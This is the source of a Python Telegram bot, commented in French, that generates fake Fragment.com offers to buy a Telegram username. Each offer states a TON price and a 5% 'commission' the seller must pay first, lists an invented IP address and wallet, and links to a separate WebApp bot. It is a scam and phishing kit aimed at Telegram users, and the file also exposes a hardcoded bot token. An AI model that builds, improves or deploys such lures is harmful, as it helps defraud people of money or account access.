import asyncio
import aiohttp
import sys
import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.error import NetworkError, TimedOut, Conflict
from telegram.helpers import escape_markdown

# Configuration simple du logging
import logging
import warnings
warnings.filterwarnings("ignore", category=RuntimeWarning)
logging.basicConfig(level=logging.ERROR)

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
FIXED_CHAT_ID = 511758924
PORT = int(os.getenv('PORT', 10000))

print(f"🔍 DEBUG: BOT_TOKEN configuré: ✅")
print(f"🔍 DEBUG: CHAT_ID fixe: {FIXED_CHAT_ID}")
print(f"🔍 DEBUG: PORT: {PORT}")

# ===== SERVEUR HTTP POUR RENDER =====
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path in ['/', '/health']:
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            html_content = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Fragment Bot Status</title>
                <meta charset="utf-8">
            </head>
            <body>
                <h1>🤖 Fragment Deal Generator</h1>
                <p>✅ Bot is running successfully!</p>
                <p>🔗 Telegram: @BidRequestWebApp_bot</p>
                <p>📊 Status: Active</p>
            </body>
            </html>
            """
            self.wfile.write(html_content.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass

def start_health_server():
    """Démarre le serveur de santé pour Render"""
    try:
        server = HTTPServer(('0.0.0.0', PORT), HealthCheckHandler)
        print(f"🌐 Serveur de santé démarré sur port {PORT}")
        server.serve_forever()
    except Exception as e:
        print(f"❌ Erreur serveur de santé: {e}")

# ===== FONCTION PRIX TON =====
async def get_ton_price():
    """Récupère le prix du TON en USD via l'API DIA"""
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(
                "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    price = float(data.get('Price', 5.50))
                    if price > 0:
                        return price
                    else:
                        return 5.50
                else:
                    return 5.50
    except Exception:
        return 5.50

# ===== FONCTION GÉNÉRATION MESSAGE =====
async def generate_fragment_message(username, price):
    """Génère le message Fragment avec formatage sécurisé"""
    try:
        # Calculs
        commission = price * 0.05
        ton_to_usd = await get_ton_price()
        price_usd = price * ton_to_usd
        commission_usd = commission * ton_to_usd
        
        # Nettoyage et validation du username
        clean_username = str(username).strip().replace('@', '').upper()
        
        # Message avec formatage sécurisé (pas de Markdown problématique)
        message = f"""We have received a purchase request for your username @{clean_username} via Fragment.com. Below are the transaction details:

• Offer Amount: 💎{price:g} TON (${price_usd:.2f} USD)
• Commission: 💎{commission:g} TON (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U

Important:
• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message."""

        # Bouton vers WebApp
        button_url = f"https://t.me/BidRequestWebApp_bot/WebApp?startapp={clean_username.lower()}-{price:g}"
        keyboard = [[InlineKeyboardButton("View details", url=button_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        return message, reply_markup
        
    except Exception as e:
        print(f"Erreur génération message: {e}")
        return None, None

# ===== GESTIONNAIRE D'ERREURS =====
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire d'erreurs pour éviter les crashes"""
    try:
        error_msg = str(context.error)
        if "Conflict" in error_msg:
            print("⚠️ Conflit détecté - instance multiple")
        else:
            print(f"⚠️ Erreur gérée: {error_msg}")
    except:
        pass

# ===== COMMANDES TELEGRAM =====
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /start"""
    try:
        if not update or not update.message:
            return
            
        user = update.effective_user
        chat_id = update.effective_chat.id
        
        message = f"""🤖 Fragment Deal Generator

Bonjour {user.first_name}! 

📱 Votre Chat ID: {chat_id}

Ce bot génère automatiquement des messages Fragment personnalisés.

Commandes disponibles:
• /create username price - Créer un message Fragment
• /help - Aide

💎 Prêt à créer vos deals!"""
        
        await update.message.reply_text(message)
        print(f"✅ /start - {user.first_name} ({chat_id})")
        
    except Exception as e:
        print(f"Erreur start: {e}")

async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /create username price"""
    try:
        if not update or not update.message:
            return
            
        if len(context.args) != 2:
            await update.message.reply_text(
                "❌ Usage: /create username price\n"
                "📝 Exemple: /create crypto 1000"
            )
            return
            
        username = str(context.args[0]).strip().lower().replace('@', '')
        
        try:
            price = float(context.args[1])
        except ValueError:
            await update.message.reply_text("❌ Format de prix invalide. Utilisez des nombres.")
            return
        
        if price <= 0:
            await update.message.reply_text("❌ Le prix doit être supérieur à 0")
            return
            
        if price > 1000000:
            await update.message.reply_text("❌ Prix trop élevé (max: 1,000,000 TON)")
            return
            
        # Message de traitement
        processing_msg = await update.message.reply_text("⏳ Génération du deal en cours...")
        
        # Génération du message
        message, reply_markup = await generate_fragment_message(username, price)
        
        if message and reply_markup:
            # Envoi du message principal
            await update.message.reply_text(
                message,
                reply_markup=reply_markup
            )
            
            # Confirmation
            await update.message.reply_text(
                f"✅ Deal créé avec succès!\n"
                f"🎯 @{username.upper()} - {price:g} TON"
            )
            
            print(f"✅ Deal: @{username} - {price} TON")
            
            # Suppression du message de traitement
            try:
                await processing_msg.delete()
            except:
                pass
                
        else:
            await update.message.reply_text("❌ Erreur lors de la génération du message")
            
    except Exception as e:
        print(f"Erreur create: {e}")
        try:
            await update.message.reply_text("❌ Erreur système. Veuillez réessayer.")
        except:
            pass

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande d'aide"""
    try:
        if not update or not update.message:
            return
            
        help_text = """🤖 Fragment Deal Generator - Aide

Commandes disponibles:
• /start - Informations du bot
• /create username price - Créer un deal Fragment
• /help - Afficher cette aide

Exemple d'utilisation:
/create crypto 1500

À propos:
Ce bot génère des messages Fragment professionnels avec calculs automatiques en TON et USD.

💎 Bot prêt à l'emploi!"""
        
        await update.message.reply_text(help_text)
        print("✅ Help affiché")
        
    except Exception as e:
        print(f"Erreur help: {e}")

# ===== FONCTION PRINCIPALE BOT =====
def run_telegram_bot_sync():
    """Lance le bot Telegram en mode synchrone"""
    attempt = 0
    max_attempts = 3
    
    while attempt < max_attempts:
        attempt += 1
        try:
            print(f"🚀 Tentative de démarrage #{attempt}...")
            
            # Configuration de l'application
            app = Application.builder().token(BOT_TOKEN).build()
            
            # Ajout des handlers
            app.add_error_handler(error_handler)
            app.add_handler(CommandHandler("start", start_command))
            app.add_handler(CommandHandler("create", create_command))
            app.add_handler(CommandHandler("help", help_command))
            
            print("✅ Bot configuré")
            print(f"💎 Chat ID configuré: {FIXED_CHAT_ID}")
            print("🔗 WebApp: BidRequestWebApp_bot/WebApp")
            print("\n📋 Commandes disponibles:")
            print("   • /start - Démarrer le bot")
            print("   • /create username price - Créer un deal")
            print("   • /help - Aide")
            print("🔄 Démarrage du polling...")
            
            # Démarrage en mode bloquant
            app.run_polling(
                poll_interval=3.0,
                timeout=15,
                bootstrap_retries=3,
                read_timeout=15,
                write_timeout=15,
                connect_timeout=15,
                pool_timeout=15,
                drop_pending_updates=True,
                allowed_updates=['message'],
                close_loop=True
            )
            
            print("🛑 Bot arrêté normalement")
            break
            
        except Conflict as e:
            print(f"❌ Conflit (tentative {attempt}): {e}")
            if attempt < max_attempts:
                print(f"⏳ Attente 30s avant nouvelle tentative...")
                import time
                time.sleep(30)
            else:
                print("❌ Abandon après plusieurs tentatives de conflit")
                
        except KeyboardInterrupt:
            print("\n🛑 Arrêt demandé par l'utilisateur")
            break
            
        except Exception as e:
            print(f"❌ Erreur (tentative {attempt}): {e}")
            if attempt < max_attempts:
                import time
                time.sleep(10)
            else:
                print("❌ Abandon après plusieurs erreurs")
                
    print("🔚 Nettoyage terminé")

# ===== FONCTION PRINCIPALE =====
def main():
    """Point d'entrée principal"""
    print("🚀 Démarrage Fragment Deal Generator...")
    print(f"🌐 URL publique: https://telegram-bot-vic3.onrender.com")
    
    try:
        # 1. Démarrage du serveur HTTP en arrière-plan
        health_thread = threading.Thread(target=start_health_server, daemon=True)
        health_thread.start()
        print("✅ Serveur de santé démarré")
        
        # 2. Attente pour s'assurer que le serveur démarre
        import time
        time.sleep(3)
        
        # 3. Lancement du bot Telegram
        print("🤖 Lancement du bot Telegram...")
        run_telegram_bot_sync()
        
    except KeyboardInterrupt:
        print("\n🛑 Arrêt par l'utilisateur")
        
    except Exception as e:
        print(f"❌ Erreur critique: {e}")
        
    finally:
        print("🔚 Application terminée")

if __name__ == '__main__':
    main()
